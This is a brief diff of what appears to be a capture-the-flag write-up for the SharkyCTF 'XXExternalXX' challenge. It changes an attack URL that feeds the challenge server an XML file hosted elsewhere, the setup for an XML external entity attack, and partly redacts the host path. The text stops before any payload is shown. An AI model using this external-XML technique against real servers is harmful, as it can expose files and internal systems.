@@ -1,6 +1,6 @@
 # XXExternalXX
 
-http://xxexternalxx.sharkyctf.xyz/?xml=http://empty.jack.su/6e13400f89d5047731b4095a7d151f1c/13373.xml
+http://xxexternalxx.sharkyctf.xyz/?xml=http://empty.jack.SECRET_REDACTED_BY_ANTIGRAVITY3.xml
 
 file:
 ```
